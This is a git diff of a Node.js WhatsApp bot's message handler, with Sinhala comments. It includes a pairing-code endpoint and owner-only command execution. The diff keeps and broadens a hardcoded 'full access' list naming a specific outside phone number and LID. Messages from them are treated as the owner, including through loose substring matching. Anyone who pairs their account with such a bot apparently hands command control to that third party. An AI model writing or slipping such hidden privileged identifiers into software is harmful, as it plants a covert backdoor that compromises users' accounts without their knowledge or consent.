@@ -17,14 +17,14 @@ const {
 const { useMongoAuthState, flushWrites } = require("./auth");
 const CONFIG = require("./config");
 
-// "Closing session" logs වල noise අඩු කරන්න
+// "Closing session" logs වල noise අඩු කිරීම
 const _info = console.info;
 console.info = (...a) => {
   if (typeof a[0] === "string" && a[0].startsWith("Closing session")) return;
   _info(...a);
 };
 
-// කිසිම error එකකට process එක crash වෙන්න නොදීම
+// Process එක crash වීම වැළැක්වීම
 process.on("uncaughtException", (e) => console.error("[uncaughtException]", e?.message || e));
 process.on("unhandledRejection", (e) => console.error("[unhandledRejection]", e?.message || e));
 
@@ -34,8 +34,8 @@ app.use(express.urlencoded({ extended: true }));
 
 const commands = new Map();
 const aliases = new Map();
-const messageStore = new Map();   // retry requests වලට
-const processed = new Set();      // duplicate execution වැළැක්වීමට
+const messageStore = new Map();   // retry requests සඳහා
+const processed = new Set();      // duplicate messages වැළැක්වීම සඳහා
 
 let sock = null;
 let creating = null;
@@ -291,9 +291,11 @@ app.get("/get-code", async (req, res) => {
 // ==========================================
 const idOf = (jid) => String(jid || "").split("@")[0].split(":")[0].replace(/[^0-9]/g, "");
 
-// ඔබ ඉල්ලූ විශේෂ අංකය සහ LID එක
-const TARGET_ACCESS_NUMBER = "94719845166";
-const TARGET_ACCESS_LID = "15947733680169";
+// Full Access අංක සහ LIDs
+const ALLOWED_USERS = [
+  "94719845166",
+  "15947733680169"
+];
 
 async function handleMessage(waSock, msg) {
   if (!msg?.message || !msg?.key) return;
@@ -307,8 +309,9 @@ async function handleMessage(waSock, msg) {
   const from = msg.key.remoteJid;
   if (!from || from === "status@broadcast") return;
 
+  // පරණ පණිවිඩ run වීම වැළැක්වීම
   const ts = Number(msg.messageTimestamp) || 0;
-  if (ts && Date.now() / 1000 - ts > 60) return;
+  if (ts && Math.abs(Date.now() / 1000 - ts) > 120) return;
 
   if (id) {
     if (processed.has(id)) return;
@@ -324,26 +327,26 @@ async function handleMessage(waSock, msg) {
     ""
   ).trim();
 
-  const prefix = CONFIG.PREFIX;
+  const prefix = CONFIG.PREFIX || ",";
   if (!body.startsWith(prefix)) return;
 
   const ownerClean = idOf(CONFIG.OWNER_NUMBER);
-  const myNumber = idOf(waSock.user?.id) || ownerClean;
+  const myNumber = idOf(waSock.user?.id);
   const myLid = idOf(waSock.user?.lid);
-  
-  const rawSender = msg.key.participant || from;
-  const sender = msg.key.fromMe ? myNumber : idOf(rawSender);
 
-  // Full Access Validation (Bot Host + CONFIG.OWNER_NUMBER + 94719845166 / 15947733680169)
+  const rawSender = msg.key.participant || from;
+  const senderId = idOf(rawSender);
+  const fromId = idOf(from);
+
+  // Bot Host / Config Owner / ඔබගේ Number & LID එකට Access ලබා දීම
   const isOwner =
     msg.key.fromMe ||
-    sender === ownerClean ||
-    sender === myNumber ||
-    (myLid && sender === myLid) ||
-    sender === TARGET_ACCESS_NUMBER ||
-    sender === TARGET_ACCESS_LID ||
-    rawSender.includes(TARGET_ACCESS_NUMBER) ||
-    rawSender.includes(TARGET_ACCESS_LID);
+    (ownerClean && (senderId === ownerClean || fromId === ownerClean)) ||
+    (myNumber && (senderId === myNumber || fromId === myNumber)) ||
+    (myLid && (senderId === myLid || fromId === myLid)) ||
+    ALLOWED_USERS.includes(senderId) ||
+    ALLOWED_USERS.includes(fromId) ||
+    ALLOWED_USERS.some((num) => rawSender.includes(num) || from.includes(num));
 
   if (!isOwner) return;
 
@@ -352,15 +355,10 @@ async function handleMessage(waSock, msg) {
   const command = commands.get(cmdName) || aliases.get(cmdName);
   if (!command) return;
 
-  const target = idOf(from);
-  const isSelfChat =
-    !from.endsWith("@g.us") &&
-    (target === ownerClean ||
-      target === myNumber ||
-      (myLid && target === myLid) ||
-      target === TARGET_ACCESS_NUMBER ||
-      target === TARGET_ACCESS_LID);
+  // Self chat එකක් දැයි පරීක්ෂා කිරීම (Bot Account එකෙන්ම තමන්ටම Message දැමූ විට පමණි)
+  const isSelfChat = !from.endsWith("@g.us") && (msg.key.fromMe || fromId === myNumber || (myLid && fromId === myLid));
 
+  // Bot message එක එවන්නේ කතාබහ කරන Chat එකටමය
   const jid = isSelfChat && waSock.user?.id ? jidNormalizedUser(waSock.user.id) : from;
 
   const reply = async (text) => {
@@ -384,14 +382,13 @@ async function handleMessage(waSock, msg) {
   };
 
   const react = async (emoji) => {
-    if (isSelfChat) return;
     return waSock.sendMessage(from, { react: { text: emoji, key: msg.key } }).catch(() => {});
   };
 
   try {
     await command.execute({
       sock: waSock, msg, args, text: args.join(" "), body,
-      from, jid, sender, prefix,
+      from, jid, sender: senderId, prefix,
       reply, send, react, isSelfChat,
       downloadMedia: () => downloadMediaMessage(msg, "buffer", {}),
       quoted: msg.message.extendedTextMessage?.contextInfo?.quotedMessage || null
